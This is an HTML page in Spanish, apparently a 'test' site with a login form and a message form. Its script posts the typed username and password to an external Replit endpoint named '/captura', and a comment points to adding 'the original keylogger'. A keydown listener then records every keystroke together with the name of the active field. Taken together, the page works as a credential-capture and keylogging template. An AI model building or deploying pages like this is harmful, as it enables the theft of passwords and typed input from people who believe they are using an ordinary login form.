<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Web de Prueba Interactiva</title>
  <style>
    /* ... Tu CSS aquí ... */
  </style>
</head>
<body>
  <div class="form-box">
    <h2>Login de Prueba</h2>
    <form id="loginForm">
      <label>Usuario: <input type="text" name="username" id="user"></label>
      <label>Contraseña: <input type="password" name="password" id="pass"></label>
      <button type="submit">Entrar</button>
    </form>
    <h2>Mensaje de Prueba</h2>
    <form id="msgForm">
      <label>Mensaje: <textarea name="mensaje" id="mensaje"></textarea></label>
      <button type="submit">Enviar Mensaje</button>
    </form>
  </div>

  <!-- Aquí empieza el código JS -->
  <script>
    // URL de tu backend en Replit (cámbiala por la tuya)
    const URL_BACKEND = "https://backend-web-prueba.maloguomez90.repl.co/captura";

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      fetch(URL_BACKEND, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tipo: "login",
          usuario: document.getElementById('user').value,
          password: document.getElementById('pass').value
        })
      })
      .then(() => alert('¡Login guardado en el backend!'));
    });

    document.getElementById('msgForm').addEventListener('submit', function(e){
      e.preventDefault();
      fetch(URL_BACKEND, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          tipo: "mensaje",
          mensaje: document.getElementById('mensaje').value
        })
      })
      .then(() => alert('¡Mensaje guardado en el backend!'));
    });

    // Si quieres, aquí puedes añadir el keylogger original también
    document.addEventListener('keydown', function(e) {
      let campo = document.activeElement.name || document.activeElement.id || 'desconocido';
      console.log('Campo:', campo, 'Tecla:', e.key);
    });

  </script>
  <!-- Aquí termina el código JS -->
</body>
</html>
